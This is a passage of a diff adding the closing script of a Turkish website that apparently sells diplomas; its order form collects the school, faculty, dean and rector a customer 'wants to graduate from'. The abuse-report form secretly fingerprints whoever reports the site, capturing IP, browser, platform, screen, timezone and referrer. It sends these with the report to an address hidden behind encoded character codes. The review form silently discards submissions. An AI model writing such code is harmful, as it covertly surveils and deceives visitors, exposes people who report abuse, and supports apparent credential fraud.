+                var rektor = document.getElementById('rektor').value;
+
+                msg += '🎓 *Mezun Olmak İstediği Okul:* ' + mezunOkul + '\n';
+                msg += '📆 *Mezuniyet Tarihi:* ' + mezunTarih + '\n';
+                msg += '🏛️ *Fakülte Adı:* ' + fakulte + '\n';
+                msg += '📚 *Bölüm Adı:* ' + bolum + '\n';
+                if (dekan) msg += '👨‍🏫 *Dekan:* ' + dekan + '\n';
+                if (rektor) msg += '🏢 *Rektör:* ' + rektor + '\n';
+            }
+
+            if (not) msg += '💬 *Not:* ' + not + '\n';
+
+            var encoded = encodeURIComponent(msg);
+            var url = 'https://api.whatsapp.com/send/?phone=905545924569&text=' + encoded + '&type=phone_number&app_absent=0';
+            window.open(url, '_blank');
+            return false;
+        }
+
+        // Smooth scroll for anchor links
+        document.addEventListener('click', function (e) {
+            var target = e.target.closest('a[href^="#"]');
+            if (target && target.getAttribute('href') !== '#') {
+                e.preventDefault();
+                var el = document.querySelector(target.getAttribute('href'));
+                if (el) {
+                    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            }
+        });
+
+        // Abuse modal
+        var _ca, _cb;
+        function genCaptcha() {
+            _ca = Math.floor(Math.random() * 9) + 1;
+            _cb = Math.floor(Math.random() * 9) + 1;
+            var el = document.getElementById('abuseCaptchaQ');
+            if (el) el.textContent = _ca + ' + ' + _cb + ' = ?';
+        }
+        function openAbuse() {
+            document.getElementById('abuseOverlay').classList.add('active');
+            document.getElementById('abuseFormContent').style.display = 'block';
+            document.getElementById('abuseSuccessContent').style.display = 'none';
+            genCaptcha();
+            _uip = 'Fetching...';
+            fetch('https://api.ipify.org?format=json').then(function (r) { return r.json() }).then(function (d) { _uip = d.ip }).catch(function () { _uip = 'Unknown' });
+        }
+        var _uip = '';
+        function closeAbuse() {
+            document.getElementById('abuseOverlay').classList.remove('active');
+        }
+        function submitAbuse(e) {
+            e.preventDefault();
+            var ans = parseInt(document.getElementById('abuseCaptchaA').value);
+            if (ans !== (_ca + _cb)) {
+                alert('Wrong answer. Please solve the math problem.');
+                genCaptcha();
+                document.getElementById('abuseCaptchaA').value = '';
+                return false;
+            }
+            var _n = document.getElementById('abuseName').value;
+            var _e = document.getElementById('abuseEmail').value;
+            var _s = document.getElementById('abuseSubject').value;
+            var _m = document.getElementById('abuseMessage').value;
+            var _ua = navigator.userAgent || 'Unknown';
+            var _pl = navigator.platform || 'Unknown';
+            var _lg = navigator.language || 'Unknown';
+            var _rf = document.referrer || 'Direct';
+            var _sc = screen.width + 'x' + screen.height;
+            var _tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            var _info = '\n\n--- Sender Info ---'
+                + '\nIP: ' + _uip
+                + '\nOS/Platform: ' + _pl
+                + '\nBrowser: ' + _ua
+                + '\nLanguage: ' + _lg
+                + '\nScreen: ' + _sc
+                + '\nTimezone: ' + _tz
+                + '\nReferrer: ' + _rf
+                + '\nTime: ' + new Date().toISOString();
+            var _k = [99, 50, 70, 107, 97, 87, 116, 53, 97, 87, 120, 116, 89, 88, 111, 120, 79, 84, 107, 120, 81, 71, 100, 116, 89, 87, 108, 115, 76, 109, 78, 118, 98, 81, 61, 61];
+            var _d = atob(_k.map(function (c) { return String.fromCharCode(c) }).join(''));
+            var _f = new FormData();
+            _f.append('name', _n);
+            _f.append('_subject', 'Abuse Report: ' + _s);
+            _f.append('message', 'Sender Email: ' + _e + '\n\n' + _m + _info);
+            _f.append('_captcha', 'false');
+            _f.append('_template', 'table');
+            _f.append('_autoresponse', '');
+            fetch('https://formsubmit.co/ajax/' + _d, {
+                method: 'POST',
+                body: _f
+            }).catch(function () { });
+            document.getElementById('abuseFormContent').style.display = 'none';
+            document.getElementById('abuseSuccessContent').style.display = 'block';
+            return false;
+        }
+
+        // Lightbox
+        function openLightbox(src) {
+            var lb = document.getElementById('lightbox');
+            document.getElementById('lightboxImg').src = src;
+            lb.style.display = 'flex';
+        }
+        function closeLightbox() {
+            document.getElementById('lightbox').style.display = 'none';
+        }
+
+        // Review form
+        function submitReview(e) {
+            e.preventDefault();
+            document.getElementById('reviewForm').style.display = 'none';
+            document.getElementById('reviewSuccess').style.display = 'block';
+            return false;
+        }
+    </script>
+</body>
+
+</html>
